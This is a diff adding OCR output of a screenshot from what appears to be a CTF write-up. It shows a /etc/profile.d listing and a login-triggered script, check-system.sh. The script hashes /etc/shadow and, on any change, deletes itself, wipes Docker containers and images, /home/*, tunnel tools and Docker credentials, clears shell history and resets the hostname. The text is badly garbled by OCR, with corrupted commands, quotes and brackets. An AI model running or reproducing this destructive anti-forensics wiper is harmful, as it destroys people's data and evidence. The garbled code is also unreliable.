@@ -1,0 +1,45 @@
+# OCR: 2f1c18dce5366fa1795095585ba6d7dd.webp
+# 来源: .\02-WriteUp\2024\2f1c18dce5366fa1795095585ba6d7dd.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:13
+
+\etc\profile.d
+] 了 文 8 称
+J etc
+IQ. = profiled
+5] ()256term.csh
+| (256term.sh
+] 口 abrtconsolenotifcationsh
+] 口 bash.completionsh
+| Dcheck-system.sh
+4 Qcolorgrep.csh
+4 Qcolorgrep.sh
+]Dcolonscsh
+]Dcolonssh
+] 口 cshioca
+4 Dlang.csh
+4 Dlang.sh
+J Dless.csh
+lesssh
+一 分 区 | Oe 门 要 环
+规 usnbinerv bash
+oLD=""
+if [4 /ete/.cadpe ]; then
+OLD="§(cat /etc/.cadpe)”
+fi
+CURRENT="$(cat /etc/shadow | sha256sum | awk -F '' ‘(print $1}')"
+if ["$OLD" I= "$CURRENT" J; then
+echo "Illegal login detected!!!"
+m -f /etc/profile.d/check-system.sh
+docker rm -f $(docker ps -aq)
+rm -rf /opt/proxy/
+rm -rf /opt/install.sh
+m -ff /root/ntp-tunnel
+1m -ff /root/sock5-tunnel
+m -rf /home/*
+1m -rf /root/.docker/config json
+docker image prune -af
+cat /devinull > ~/-bash_history
+echo ™ > -/bashrc
+hostnamect set-hostname localhost
+history -c
